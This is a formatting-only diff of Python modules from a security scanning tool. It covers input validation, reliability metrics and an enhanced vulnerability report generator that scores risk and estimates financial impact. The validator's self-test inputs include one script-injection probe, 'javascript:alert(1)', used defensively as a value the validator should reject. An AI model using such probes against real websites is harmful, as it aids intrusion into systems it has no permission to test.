{}\n+            \"timestamp\": datetime.now().isoformat(),\n+            \"summary\": self.get_performance_summary(),\n+            \"detailed_metrics\": {},\n         }\n-        \n+\n         for op_type, metrics in self.metrics.items():\n-            export_data['detailed_metrics'][op_type] = {\n-                'total_operations': metrics.total_operations,\n-                'successful_operations': metrics.successful_operations,\n-                'failed_operations': metrics.failed_operations,\n-                'false_positives': metrics.false_positives,\n-                'verified_findings': metrics.verified_findings,\n-                'avg_response_time': metrics.avg_response_time,\n-                'success_rate': metrics.success_rate,\n-                'accuracy_rate': metrics.accuracy_rate,\n-                'last_updated': metrics.last_updated.isoformat()\n+            export_data[\"detailed_metrics\"][op_type] = {\n+                \"total_operations\": metrics.total_operations,\n+                \"successful_operations\": metrics.successful_operations,\n+                \"failed_operations\": metrics.failed_operations,\n+                \"false_positives\": metrics.false_positives,\n+                \"verified_findings\": metrics.verified_findings,\n+                \"avg_response_time\": metrics.avg_response_time,\n+                \"success_rate\": metrics.success_rate,\n+                \"accuracy_rate\": metrics.accuracy_rate,\n+                \"last_updated\": metrics.last_updated.isoformat(),\n             }\n-        \n-        with open(file_path, 'w') as f:\n+\n+        with open(file_path, \"w\") as f:\n             json.dump(export_data, f, indent=2)\n+\n \n # Global instances\n enhanced_validator = EnhancedValidator()\n reliability_tracker = ReliabilityTracker()\n+\n \n def validate_target_input(target: str, input_type: str = \"auto\") -> ValidationResult:\n     \"\"\"Validate a single target input\"\"\"\n     if input_type == \"auto\":\n         # Auto-detect type\n         if enhanced_validator.ip_pattern.match(target.strip()):\n             return enhanced_validator.validate_ip(target)\n-        elif target.strip().startswith(('http://', 'https://')):\n+        elif target.strip().startswith((\"http://\", \"https://\")):\n             return enhanced_validator.validate_url(target)\n         else:\n             return enhanced_validator.validate_domain(target)\n     elif input_type == \"domain\":\n         return enhanced_validator.validate_domain(target)\n@@ -445,51 +503,60 @@\n     elif input_type == \"url\":\n         return enhanced_validator.validate_url(target)\n     else:\n         return ValidationResult(False, \"\", \"unknown\", 0.0, [\"Unknown input type\"])\n \n+\n def validate_targets_file(file_path: str) -> Tuple[List[str], Dict[str, Any]]:\n     \"\"\"Validate targets from a file and return cleaned targets with stats\"\"\"\n     try:\n-        with open(file_path, 'r') as f:\n-            lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]\n-        \n-        valid_targets, invalid_targets, stats = enhanced_validator.bulk_validate_and_clean(lines)\n-        \n-        stats['file_path'] = file_path\n-        stats['total_lines'] = len(lines)\n-        \n+        with open(file_path, \"r\") as f:\n+            lines = [\n+                line.strip() for line in f if line.strip() and not line.startswith(\"#\")\n+            ]\n+\n+        valid_targets, invalid_targets, stats = (\n+            enhanced_validator.bulk_validate_and_clean(lines)\n+        )\n+\n+        stats[\"file_path\"] = file_path\n+        stats[\"total_lines\"] = len(lines)\n+\n         return valid_targets, stats\n-    \n+\n     except Exception as e:\n-        return [], {'error': str(e), 'file_path': file_path}\n+        return [], {\"error\": str(e), \"file_path\": file_path}\n+\n \n def get_system_reliability_score() -> float:\n     \"\"\"Get overall system reliability score\"\"\"\n     summary = reliability_tracker.get_performance_summary()\n-    return summary.get('overall_reliability', 0.0)\n+    return summary.get(\"overall_reliability\", 0.0)\n+\n \n if __name__ == \"__main__\":\n     # Test the validation system\n     print(\"Enhanced Validation System - Test\")\n-    \n+\n     test_inputs = [\n         \"example.com\",\n         \"192.168.1.1\",\n         \"https://example.com\",\n         \"invalid..domain\",\n         \"127.0.0.1\",\n-        \"javascript:alert(1)\"\n+        \"javascript:alert(1)\",\n     ]\n-    \n+\n     for inp in test_inputs:\n         result = validate_target_input(inp)\n         status = \"\u2705\" if result.is_valid else \"\u274c\"\n-        print(f\"{status} {inp} -> {result.cleaned_input} (confidence: {result.confidence_score:.1%})\")\n-        \n+        print(\n+            f\"{status} {inp} -> {result.cleaned_input} (confidence: {result.confidence_score:.1%})\"\n+        )\n+\n         if result.warnings:\n             for warning in result.warnings:\n                 print(f\"  \u26a0\ufe0f  {warning}\")\n-        \n+\n         if result.suggestions:\n             for suggestion in result.suggestions:\n-                print(f\"  \ud83d\udca1 {suggestion}\")\n\\ No newline at end of file\n+                print(f\"  \ud83d\udca1 {suggestion}\")\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_report_controller.py\t2025-09-14 19:10:58.550754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_report_controller.py\t2025-09-14 19:23:11.366771+00:00\n@@ -13,388 +13,520 @@\n from pathlib import Path\n from typing import Dict, List, Any, Optional, Tuple\n from dataclasses import asdict\n \n from intelligent_report_engine import (\n-    IntelligentReportAnalyzer, AdvancedRiskCalculator, VulnerabilityCorrelationEngine,\n-    ThreatIntelligenceAggregator, VulnerabilityContext, BusinessContext, ThreatLevel\n+    IntelligentReportAnalyzer,\n+    AdvancedRiskCalculator,\n+    VulnerabilityCorrelationEngine,\n+    ThreatIntelligenceAggregator,\n+    VulnerabilityContext,\n+    BusinessContext,\n+    ThreatLevel,\n )\n \n \n class EnhancedReportController:\n     \"\"\"Enhanced report controller with intelligent analysis capabilities\"\"\"\n-    \n+\n     def __init__(self, config: Dict[str, Any], logger: logging.Logger):\n         self.config = config\n         self.logger = logger\n-        \n+\n         # Initialize intelligent analysis components\n         self.report_analyzer = IntelligentReportAnalyzer(config)\n         self.risk_calculator = AdvancedRiskCalculator(self._create_business_context())\n         self.correlation_engine = VulnerabilityCorrelationEngine()\n         self.threat_aggregator = ThreatIntelligenceAggregator(config)\n-        \n+\n         # Enhanced reporting configuration\n         self.reporting_config = config.get(\"enhanced_reporting\", {})\n-        self.enable_deep_analysis = self.reporting_config.get(\"enable_deep_analysis\", True)\n+        self.enable_deep_analysis = self.reporting_config.get(\n+            \"enable_deep_analysis\", True\n+        )\n         self.enable_correlation = self.reporting_config.get(\"enable_correlation\", True)\n-        self.enable_threat_intel = self.reporting_config.get(\"enable_threat_intelligence\", True)\n-        self.narrative_generation = self.reporting_config.get(\"enable_narrative_generation\", True)\n-        \n+        self.enable_threat_intel = self.reporting_config.get(\n+            \"enable_threat_intelligence\", True\n+        )\n+        self.narrative_generation = self.reporting_config.get(\n+            \"enable_narrative_generation\", True\n+        )\n+\n     def _create_business_context(self) -> BusinessContext:\n         \"\"\"Create business context from configuration\"\"\"\n         business_config = self.config.get(\"business_context\", {})\n-        \n+\n         return BusinessContext(\n             asset_criticality=business_config.get(\"asset_criticality\", 5.0),\n             data_sensitivity=business_config.get(\"data_sensitivity\", 5.0),\n-            availability_requirement=business_config.get(\"availability_requirement\", 5.0),\n-            compliance_requirements=business_config.get(\"compliance_requirements\", [\"GDPR\"]),\n+            availability_requirement=business_config.get(\n+                \"availability_requirement\", 5.0\n+            ),\n+            compliance_requirements=business_config.get(\n+                \"compliance_requirements\", [\"GDPR\"]\n+            ),\n             business_hours_impact=business_config.get(\"business_hours_impact\", 1.0),\n-            revenue_impact_per_hour=business_config.get(\"revenue_impact_per_hour\", 10000.0)\n+            revenue_impact_per_hour=business_config.get(\n+                \"revenue_impact_per_hour\", 10000.0\n+            ),\n         )\n-    \n-    def generate_enhanced_report(self, run_dir: Path, recon_results: Dict[str, Any], \n-                               vuln_results: Dict[str, Any], targets: List[str]) -> Dict[str, Any]:\n+\n+    def generate_enhanced_report(\n+        self,\n+        run_dir: Path,\n+        recon_results: Dict[str, Any],\n+        vuln_results: Dict[str, Any],\n+        targets: List[str],\n+    ) -> Dict[str, Any]:\n         \"\"\"Generate enhanced report with intelligent analysis\"\"\"\n-        self.logger.info(\"Starting enhanced report generation with intelligent analysis\")\n-        \n+        self.logger.info(\n+            \"Starting enhanced report generation with intelligent analysis\"\n+        )\n+\n         try:\n             # Extract vulnerabilities for analysis\n             vulnerabilities = self._extract_vulnerabilities(vuln_results)\n-            \n+\n             # Apply intelligent analysis\n             if self.enable_deep_analysis and vulnerabilities:\n-                self.logger.info(f\"Analyzing {len(vulnerabilities)} vulnerabilities with intelligent engine\")\n-                enhanced_vulnerabilities = self.report_analyzer.analyze_vulnerability_intelligence(vulnerabilities)\n+                self.logger.info(\n+                    f\"Analyzing {len(vulnerabilities)} vulnerabilities with intelligent engine\"\n+                )\n+                enhanced_vulnerabilities = (\n+                    self.report_analyzer.analyze_vulnerability_intelligence(\n+                        vulnerabilities\n+                    )\n+                )\n             else:\n                 enhanced_vulnerabilities = vulnerabilities\n-            \n+\n             # Calculate advanced risk assessment\n             if enhanced_vulnerabilities:\n                 self.logger.info(\"Calculating contextual risk assessment\")\n-                risk_assessment = self.risk_calculator.calculate_contextual_risk(enhanced_vulnerabilities)\n+                risk_assessment = self.risk_calculator.calculate_contextual_risk(\n+                    enhanced_vulnerabilities\n+                )\n             else:\n                 risk_assessment = self.risk_calculator.calculate_contextual_risk([])\n-            \n+\n             # Perform correlation analysis\n             correlations = {}\n             if self.enable_correlation and enhanced_vulnerabilities:\n                 self.logger.info(\"Performing vulnerability correlation analysis\")\n-                correlations = self.correlation_engine.analyze_correlations(enhanced_vulnerabilities)\n-            \n+                correlations = self.correlation_engine.analyze_correlations(\n+                    enhanced_vulnerabilities\n+                )\n+\n             # Aggregate threat intelligence\n             threat_intelligence = {}\n             if self.enable_threat_intel:\n                 self.logger.info(\"Aggregating threat intelligence\")\n                 threat_intel = self.threat_aggregator.aggregate_threat_intelligence(\n                     enhanced_vulnerabilities, targets\n                 )\n                 threat_intelligence = asdict(threat_intel)\n-            \n+\n             # Generate executive narrative\n             executive_narrative = self._generate_executive_narrative(\n-                enhanced_vulnerabilities, risk_assessment, correlations, threat_intelligence\n-            )\n-            \n+                enhanced_vulnerabilities,\n+                risk_assessment,\n+                correlations,\n+                threat_intelligence,\n+            )\n+\n             # Generate technical analysis\n             technical_analysis = self._generate_technical_analysis(\n                 enhanced_vulnerabilities, correlations\n             )\n-            \n+\n             # Create comprehensive report structure\n             enhanced_report = {\n                 \"report_metadata\": {\n                     \"run_id\": run_dir.name,\n                     \"generation_timestamp\": datetime.now().isoformat(),\n                     \"analysis_engine_version\": \"9.0.0-enhanced\",\n                     \"targets_analyzed\": targets,\n                     \"total_vulnerabilities\": len(enhanced_vulnerabilities),\n-                    \"analysis_depth\": \"DEEP\" if self.enable_deep_analysis else \"STANDARD\"\n+                    \"analysis_depth\": (\n+                        \"DEEP\" if self.enable_deep_analysis else \"STANDARD\"\n+                    ),\n                 },\n-                \n                 \"executive_summary\": self._generate_enhanced_executive_summary(\n                     recon_results, enhanced_vulnerabilities, risk_assessment\n                 ),\n-                \n                 \"risk_assessment\": risk_assessment,\n-                \n                 \"threat_intelligence\": threat_intelligence,\n-                \n                 \"vulnerability_analysis\": {\n-                    \"enhanced_vulnerabilities\": [self._serialize_vulnerability_context(v) for v in enhanced_vulnerabilities],\n+                    \"enhanced_vulnerabilities\": [\n+                        self._serialize_vulnerability_context(v)\n+                        for v in enhanced_vulnerabilities\n+                    ],\n                     \"correlation_analysis\": correlations,\n-                    \"attack_surface_analysis\": self._analyze_attack_surface(recon_results, enhanced_vulnerabilities),\n-                    \"temporal_analysis\": self._perform_temporal_analysis(enhanced_vulnerabilities)\n+                    \"attack_surface_analysis\": self._analyze_attack_surface(\n+                        recon_results, enhanced_vulnerabilities\n+                    ),\n+                    \"temporal_analysis\": self._perform_temporal_analysis(\n+                        enhanced_vulnerabilities\n+                    ),\n                 },\n-                \n                 \"executive_narrative\": executive_narrative,\n-                \n                 \"technical_analysis\": technical_analysis,\n-                \n                 \"remediation_roadmap\": self._generate_remediation_roadmap(\n                     enhanced_vulnerabilities, risk_assessment\n                 ),\n-                \n                 \"compliance_assessment\": self._generate_compliance_assessment(\n                     enhanced_vulnerabilities, risk_assessment\n                 ),\n-                \n                 \"recommendations\": {\n                     \"immediate_actions\": risk_assessment.get(\"recommendations\", [])[:5],\n-                    \"strategic_initiatives\": self._generate_strategic_recommendations(risk_assessment),\n-                    \"monitoring_improvements\": self._generate_monitoring_recommendations(enhanced_vulnerabilities)\n+                    \"strategic_initiatives\": self._generate_strategic_recommendations(\n+                        risk_assessment\n+                    ),\n+                    \"monitoring_improvements\": self._generate_monitoring_recommendations(\n+                        enhanced_vulnerabilities\n+                    ),\n                 },\n-                \n                 \"appendices\": {\n                     \"raw_recon_data\": recon_results,\n                     \"raw_vulnerability_data\": vuln_results,\n-                    \"analysis_confidence\": self._calculate_analysis_confidence(enhanced_vulnerabilities),\n-                    \"methodology\": self._document_methodology()\n-                }\n+                    \"analysis_confidence\": self._calculate_analysis_confidence(\n+                        enhanced_vulnerabilities\n+                    ),\n+                    \"methodology\": self._document_methodology(),\n+                },\n             }\n-            \n+\n             self.logger.info(\"Enhanced report generation completed successfully\")\n             return enhanced_report\n-            \n+\n         except Exception as e:\n             self.logger.error(f\"Enhanced report generation failed: {e}\")\n             # Fallback to basic report structure\n-            return self._generate_fallback_report(run_dir, recon_results, vuln_results, targets)\n-    \n-    def _serialize_vulnerability_context(self, vuln: VulnerabilityContext) -> Dict[str, Any]:\n+            return self._generate_fallback_report(\n+                run_dir, recon_results, vuln_results, targets\n+            )\n+\n+    def _serialize_vulnerability_context(\n+        self, vuln: VulnerabilityContext\n+    ) -> Dict[str, Any]:\n         \"\"\"Serialize VulnerabilityContext to JSON-serializable dict\"\"\"\n         vuln_dict = asdict(vuln)\n         # Convert enum to string\n-        if 'attack_vector' in vuln_dict:\n-            vuln_dict['attack_vector'] = vuln_dict['attack_vector'].value if hasattr(vuln_dict['attack_vector'], 'value') else str(vuln_dict['attack_vector'])\n+        if \"attack_vector\" in vuln_dict:\n+            vuln_dict[\"attack_vector\"] = (\n+                vuln_dict[\"attack_vector\"].value\n+                if hasattr(vuln_dict[\"attack_vector\"], \"value\")\n+                else str(vuln_dict[\"attack_vector\"])\n+            )\n         return vuln_dict\n-    \n-    def _extract_vulnerabilities(self, vuln_results: Dict[str, Any]) -> List[VulnerabilityContext]:\n+\n+    def _extract_vulnerabilities(\n+        self, vuln_results: Dict[str, Any]\n+    ) -> List[VulnerabilityContext]:\n         \"\"\"Extract and convert vulnerabilities to enhanced context objects\"\"\"\n         vulnerabilities = []\n-        \n+\n         for target, data in vuln_results.items():\n             nuclei_raw = data.get(\"nuclei_raw\", [])\n-            \n+\n             for line in nuclei_raw:\n                 try:\n                     if isinstance(line, str) and line.strip():\n                         vuln_data = json.loads(line)\n                         # Create basic vulnerability context that will be enhanced by the analyzer\n                         vuln_dict = {\n                             \"info\": vuln_data.get(\"info\", {}),\n                             \"template-id\": vuln_data.get(\"template-id\", \"unknown\"),\n                             \"matched-at\": vuln_data.get(\"matched-at\", target),\n-                            \"response\": vuln_data.get(\"response\", \"\")\n+                            \"response\": vuln_data.get(\"response\", \"\"),\n                         }\n                         vulnerabilities.append(vuln_dict)\n                 except (json.JSONDecodeError, KeyError) as e:\n                     self.logger.warning(f\"Failed to parse vulnerability data: {e}\")\n                     continue\n-        \n+\n         return vulnerabilities\n-    \n-    def _generate_enhanced_executive_summary(self, recon_results: Dict[str, Any], \n-                                           vulnerabilities: List[VulnerabilityContext], \n-                                           risk_assessment: Dict[str, Any]) -> Dict[str, Any]:\n+\n+    def _generate_enhanced_executive_summary(\n+        self,\n+        recon_results: Dict[str, Any],\n+        vulnerabilities: List[VulnerabilityContext],\n+        risk_assessment: Dict[str, Any],\n+    ) -> Dict[str, Any]:\n         \"\"\"Generate enhanced executive summary with business context\"\"\"\n         # Calculate enhanced metrics\n         total_targets = len(recon_results)\n-        total_subdomains = sum(len(data.get(\"subdomains\", [])) for data in recon_results.values())\n-        total_open_ports = sum(len(data.get(\"open_ports\", [])) for data in recon_results.values())\n-        total_http_services = sum(len(data.get(\"http_info\", [])) for data in recon_results.values())\n-        \n+        total_subdomains = sum(\n+            len(data.get(\"subdomains\", [])) for data in recon_results.values()\n+        )\n+        total_open_ports = sum(\n+            len(data.get(\"open_ports\", [])) for data in recon_results.values()\n+        )\n+        total_http_services = sum(\n+            len(data.get(\"http_info\", [])) for data in recon_results.values()\n+        )\n+\n         # Vulnerability statistics\n         severity_counts = risk_assessment.get(\"severity_breakdown\", {})\n         total_vulnerabilities = sum(severity_counts.values())\n-        \n+\n         # Business impact analysis\n         business_impact_score = risk_assessment.get(\"business_impact_score\", 0)\n-        estimated_financial_impact = self._estimate_financial_impact(vulnerabilities, risk_assessment)\n-        \n+        estimated_financial_impact = self._estimate_financial_impact(\n+            vulnerabilities, risk_assessment\n+        )\n+\n         # Key insights\n         key_insights = self._generate_key_insights(vulnerabilities, risk_assessment)\n-        \n+\n         return {\n             \"scan_overview\": {\n                 \"targets_scanned\": total_targets,\n                 \"subdomains_discovered\": total_subdomains,\n                 \"open_ports_found\": total_open_ports,\n                 \"http_services_identified\": total_http_services,\n                 \"scan_completion_time\": datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\"),\n-                \"scan_duration\": \"Estimated based on analysis depth\"\n-            },\n-            \n+                \"scan_duration\": \"Estimated based on analysis depth\",\n+            },\n             \"security_posture\": {\n                 \"overall_risk_level\": risk_assessment.get(\"risk_level\", \"UNKNOWN\"),\n                 \"risk_score\": risk_assessment.get(\"overall_risk_score\", 0),\n                 \"vulnerabilities_found\": total_vulnerabilities,\n                 \"severity_distribution\": severity_counts,\n                 \"critical_findings_count\": severity_counts.get(\"critical\", 0),\n-                \"exploitable_vulnerabilities\": len([v for v in vulnerabilities if hasattr(v, 'exploitability') and v.exploitability > 0.7])\n-            },\n-            \n+                \"exploitable_vulnerabilities\": len(\n+                    [\n+                        v\n+                        for v in vulnerabilities\n+                        if hasattr(v, \"exploitability\") and v.exploitability > 0.7\n+                    ]\n+                ),\n+            },\n             \"business_impact\": {\n                 \"impact_score\": business_impact_score,\n                 \"estimated_financial_impact\": estimated_financial_impact,\n-                \"time_to_compromise\": risk_assessment.get(\"time_to_compromise\", \"Unknown\"),\n-                \"affected_business_functions\": self._identify_affected_business_functions(vulnerabilities),\n-                \"compliance_violations\": len(risk_assessment.get(\"compliance_impact\", []))\n-            },\n-            \n+                \"time_to_compromise\": risk_assessment.get(\n+                    \"time_to_compromise\", \"Unknown\"\n+                ),\n+                \"affected_business_functions\": self._identify_affected_business_functions(\n+                    vulnerabilities\n+                ),\n+                \"compliance_violations\": len(\n+                    risk_assessment.get(\"compliance_impact\", [])\n+                ),\n+            },\n             \"key_insights\": key_insights,\n-            \n             \"immediate_priorities\": {\n                 \"critical_actions\": risk_assessment.get(\"recommendations\", [])[:3],\n                 \"quick_wins\": self._identify_quick_wins(vulnerabilities),\n-                \"resource_requirements\": self._estimate_resource_requirements(vulnerabilities)\n-            }\n-        }\n-    \n-    def _estimate_financial_impact(self, vulnerabilities: List[VulnerabilityContext], \n-                                 risk_assessment: Dict[str, Any]) -> Dict[str, Any]:\n+                \"resource_requirements\": self._estimate_resource_requirements(\n+                    vulnerabilities\n+                ),\n+            },\n+        }\n+\n+    def _estimate_financial_impact(\n+        self,\n+        vulnerabilities: List[VulnerabilityContext],\n+        risk_assessment: Dict[str, Any],\n+    ) -> Dict[str, Any]:\n         \"\"\"Estimate potential financial impact\"\"\"\n         business_context = self._create_business_context()\n-        \n+\n         # Calculate potential downtime impact\n-        high_impact_vulns = [v for v in vulnerabilities if hasattr(v, 'business_impact') and v.business_impact >= 7.0]\n-        critical_vulns = [v for v in vulnerabilities if hasattr(v, 'severity') and v.severity.lower() == 'critical']\n-        \n+        high_impact_vulns = [\n+            v\n+            for v in vulnerabilities\n+            if hasattr(v, \"business_impact\") and v.business_impact >= 7.0\n+        ]\n+        critical_vulns = [\n+            v\n+            for v in vulnerabilities\n+            if hasattr(v, \"severity\") and v.severity.lower() == \"critical\"\n+        ]\n+\n         # Estimate downtime scenarios\n         if critical_vulns:\n-            potential_downtime_hours = 24  # Assume 24 hours for critical vulnerabilities\n+            potential_downtime_hours = (\n+                24  # Assume 24 hours for critical vulnerabilities\n+            )\n         elif high_impact_vulns:\n-            potential_downtime_hours = 8   # Assume 8 hours for high-impact vulnerabilities\n+            potential_downtime_hours = (\n+                8  # Assume 8 hours for high-impact vulnerabilities\n+            )\n         else:\n-            potential_downtime_hours = 2   # Assume 2 hours for other scenarios\n-        \n-        revenue_impact = potential_downtime_hours * business_context.revenue_impact_per_hour\n-        \n+            potential_downtime_hours = 2  # Assume 2 hours for other scenarios\n+\n+        revenue_impact = (\n+            potential_downtime_hours * business_context.revenue_impact_per_hour\n+        )\n+\n         # Add remediation costs\n-        remediation_cost = len(vulnerabilities) * 500  # Assume $500 per vulnerability for remediation\n-        \n+        remediation_cost = (\n+            len(vulnerabilities) * 500\n+        )  # Assume $500 per vulnerability for remediation\n+\n         # Add compliance penalty estimates\n         compliance_penalties = 0\n         if risk_assessment.get(\"compliance_impact\"):\n             compliance_penalties = 50000  # Base compliance penalty estimate\n-        \n+\n         return {\n             \"potential_revenue_loss\": revenue_impact,\n             \"estimated_remediation_cost\": remediation_cost,\n             \"potential_compliance_penalties\": compliance_penalties,\n-            \"total_potential_impact\": revenue_impact + remediation_cost + compliance_penalties,\n-            \"risk_basis\": f\"Based on {potential_downtime_hours}h downtime scenario\"\n-        }\n-    \n-    def _generate_key_insights(self, vulnerabilities: List[VulnerabilityContext], \n-                             risk_assessment: Dict[str, Any]) -> List[Dict[str, Any]]:\n+            \"total_potential_impact\": revenue_impact\n+            + remediation_cost\n+            + compliance_penalties,\n+            \"risk_basis\": f\"Based on {potential_downtime_hours}h downtime scenario\",\n+        }\n+\n+    def _generate_key_insights(\n+        self,\n+        vulnerabilities: List[VulnerabilityContext],\n+        risk_assessment: Dict[str, Any],\n+    ) -> List[Dict[str, Any]]:\n         \"\"\"Generate key business insights from the analysis\"\"\"\n         insights = []\n-        \n+\n         # Risk level insight\n         risk_level = risk_assessment.get(\"risk_level\", \"UNKNOWN\")\n         if risk_level in [\"CRITICAL\", \"HIGH\"]:\n-            insights.append({\n-                \"type\": \"RISK_ALERT\",\n-                \"priority\": \"HIGH\",\n-                \"title\": f\"{risk_level} Risk Level Detected\",\n-                \"description\": f\"Organization faces {risk_level.lower()} cybersecurity risk requiring immediate attention\",\n-                \"business_implication\": \"Potential for significant business disruption and financial loss\"\n-            })\n-        \n+            insights.append(\n+                {\n+                    \"type\": \"RISK_ALERT\",\n+                    \"priority\": \"HIGH\",\n+                    \"title\": f\"{risk_level} Risk Level Detected\",\n+                    \"description\": f\"Organization faces {risk_level.lower()} cybersecurity risk requiring immediate attention\",\n+                    \"business_implication\": \"Potential for significant business disruption and financial loss\",\n+                }\n+            )\n+\n         # Attack surface insight\n-        if len(set(v.target for v in vulnerabilities if hasattr(v, 'target'))) > 10:\n-            insights.append({\n-                \"type\": \"ATTACK_SURFACE\",\n-                \"priority\": \"MEDIUM\",\n-                \"title\": \"Large Attack Surface Detected\",\n-                \"description\": \"Multiple systems and services exposed to potential attacks\",\n-                \"business_implication\": \"Increased complexity in security management and higher attack probability\"\n-            })\n-        \n+        if len(set(v.target for v in vulnerabilities if hasattr(v, \"target\"))) > 10:\n+            insights.append(\n+                {\n+                    \"type\": \"ATTACK_SURFACE\",\n+                    \"priority\": \"MEDIUM\",\n+                    \"title\": \"Large Attack Surface Detected\",\n+                    \"description\": \"Multiple systems and services exposed to potential attacks\",\n+                    \"business_implication\": \"Increased complexity in security management and higher attack probability\",\n+                }\n+            )\n+\n         # Exploitability insight\n-        highly_exploitable = [v for v in vulnerabilities if hasattr(v, 'exploitability') and v.exploitability > 0.8]\n+        highly_exploitable = [\n+            v\n+            for v in vulnerabilities\n+            if hasattr(v, \"exploitability\") and v.exploitability > 0.8\n+        ]\n         if highly_exploitable:\n-            insights.append({\n-                \"type\": \"EXPLOITABILITY\",\n-                \"priority\": \"HIGH\",\n-                \"title\": f\"{len(highly_exploitable)} Highly Exploitable Vulnerabilities\",\n-                \"description\": \"Vulnerabilities with readily available exploit tools and techniques\",\n-                \"business_implication\": \"High probability of successful attacks with minimal attacker effort\"\n-            })\n-        \n+            insights.append(\n+                {\n+                    \"type\": \"EXPLOITABILITY\",\n+                    \"priority\": \"HIGH\",\n+                    \"title\": f\"{len(highly_exploitable)} Highly Exploitable Vulnerabilities\",\n+                    \"description\": \"Vulnerabilities with readily available exploit tools and techniques\",\n+                    \"business_implication\": \"High probability of successful attacks with minimal attacker effort\",\n+                }\n+            )\n+\n         # Compliance insight\n         if risk_assessment.get(\"compliance_impact\"):\n-            insights.append({\n-                \"type\": \"COMPLIANCE\",\n-                \"priority\": \"HIGH\",\n-                \"title\": \"Compliance Violations Detected\",\n-                \"description\": \"Security findings may violate regulatory requirements\",\n-                \"business_implication\": \"Potential for regulatory penalties and reputation damage\"\n-            })\n-        \n+            insights.append(\n+                {\n+                    \"type\": \"COMPLIANCE\",\n+                    \"priority\": \"HIGH\",\n+                    \"title\": \"Compliance Violations Detected\",\n+                    \"description\": \"Security findings may violate regulatory requirements\",\n+                    \"business_implication\": \"Potential for regulatory penalties and reputation damage\",\n+                }\n+            )\n+\n         return insights\n-    \n-    def _identify_affected_business_functions(self, vulnerabilities: List[VulnerabilityContext]) -> List[str]:\n+\n+    def _identify_affected_business_functions(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[str]:\n         \"\"\"Identify affected business functions based on vulnerabilities\"\"\"\n         functions = set()\n-        \n+\n         for vuln in vulnerabilities:\n-            if not hasattr(vuln, 'template_id'):\n+            if not hasattr(vuln, \"template_id\"):\n                 continue\n-                \n+\n             template_lower = vuln.template_id.lower()\n-            \n-            if any(pattern in template_lower for pattern in [\"auth\", \"login\", \"session\"]):\n+\n+            if any(\n+                pattern in template_lower for pattern in [\"auth\", \"login\", \"session\"]\n+            ):\n                 functions.add(\"Authentication & Access Control\")\n-            \n-            if any(pattern in template_lower for pattern in [\"payment\", \"cart\", \"checkout\"]):\n+\n+            if any(\n+                pattern in template_lower for pattern in [\"payment\", \"cart\", \"checkout\"]\n+            ):\n                 functions.add(\"E-commerce & Payments\")\n-            \n-            if any(pattern in template_lower for pattern in [\"data\", \"database\", \"sql\"]):\n+\n+            if any(\n+                pattern in template_lower for pattern in [\"data\", \"database\", \"sql\"]\n+            ):\n                 functions.add(\"Data Management\")\n-            \n-            if any(pattern in template_lower for pattern in [\"admin\", \"management\", \"config\"]):\n+\n+            if any(\n+                pattern in template_lower\n+                for pattern in [\"admin\", \"management\", \"config\"]\n+            ):\n                 functions.add(\"System Administration\")\n-            \n-            if any(pattern in template_lower for pattern in [\"api\", \"service\", \"endpoint\"]):\n+\n+            if any(\n+                pattern in template_lower for pattern in [\"api\", \"service\", \"endpoint\"]\n+            ):\n                 functions.add(\"API & Integration Services\")\n-            \n+\n             if any(pattern in template_lower for pattern in [\"mail\", \"smtp\", \"email\"]):\n                 functions.add(\"Email & Communication\")\n-        \n+\n         return list(functions) if functions else [\"General Business Operations\"]\n-    \n-    def _identify_quick_wins(self, vulnerabilities: List[VulnerabilityContext]) -> List[Dict[str, Any]]:\n+\n+    def _identify_quick_wins(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[Dict[str, Any]]:\n         \"\"\"Identify quick win remediation opportunities\"\"\"\n         quick_wins = []\n-        \n+\n         for vuln in vulnerabilities:\n-            if not hasattr(vuln, 'remediation_complexity') or not hasattr(vuln, 'business_impact'):\n+            if not hasattr(vuln, \"remediation_complexity\") or not hasattr(\n+                vuln, \"business_impact\"\n+            ):\n                 continue\n-                \n+\n             # Low complexity, medium+ impact = quick win\n             if vuln.remediation_complexity <= 2 and vuln.business_impact >= 5.0:\n-                quick_wins.append({\n-                    \"vulnerability\": vuln.template_id,\n-                    \"target\": getattr(vuln, 'target', 'Unknown'),\n-                    \"effort\": \"Low\",\n-                    \"impact\": \"Medium-High\",\n-                    \"estimated_time\": \"1-4 hours\"\n-                })\n-        \n+                quick_wins.append(\n+                    {\n+                        \"vulnerability\": vuln.template_id,\n+                        \"target\": getattr(vuln, \"target\", \"Unknown\"),\n+                        \"effort\": \"Low\",\n+                        \"impact\": \"Medium-High\",\n+                        \"estimated_time\": \"1-4 hours\",\n+                    }\n+                )\n+\n         return sorted(quick_wins, key=lambda x: x.get(\"impact\", \"\"), reverse=True)[:5]\n-    \n-    def _estimate_resource_requirements(self, vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+\n+    def _estimate_resource_requirements(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> Dict[str, Any]:\n         \"\"\"Estimate resource requirements for remediation\"\"\"\n         if not vulnerabilities:\n             return {\"total_effort\": \"Minimal\", \"timeline\": \"Ongoing monitoring\"}\n-        \n-        total_complexity = sum(getattr(v, 'remediation_complexity', 3) for v in vulnerabilities)\n+\n+        total_complexity = sum(\n+            getattr(v, \"remediation_complexity\", 3) for v in vulnerabilities\n+        )\n         avg_complexity = total_complexity / len(vulnerabilities)\n-        \n+\n         # Estimate based on complexity and count\n         if avg_complexity <= 2:\n             effort_level = \"Low\"\n             timeline = \"1-2 weeks\"\n             team_size = \"1-2 engineers\"\n@@ -404,187 +536,238 @@\n             team_size = \"2-3 engineers\"\n         else:\n             effort_level = \"High\"\n             timeline = \"4-8 weeks\"\n             team_size = \"3-5 engineers + specialists\"\n-        \n+\n         return {\n             \"total_effort\": effort_level,\n             \"estimated_timeline\": timeline,\n             \"recommended_team_size\": team_size,\n-            \"specialist_skills_needed\": self._identify_specialist_skills(vulnerabilities)\n-        }\n-    \n-    def _identify_specialist_skills(self, vulnerabilities: List[VulnerabilityContext]) -> List[str]:\n+            \"specialist_skills_needed\": self._identify_specialist_skills(\n+                vulnerabilities\n+            ),\n+        }\n+\n+    def _identify_specialist_skills(\n+        self, vulnerabilities: 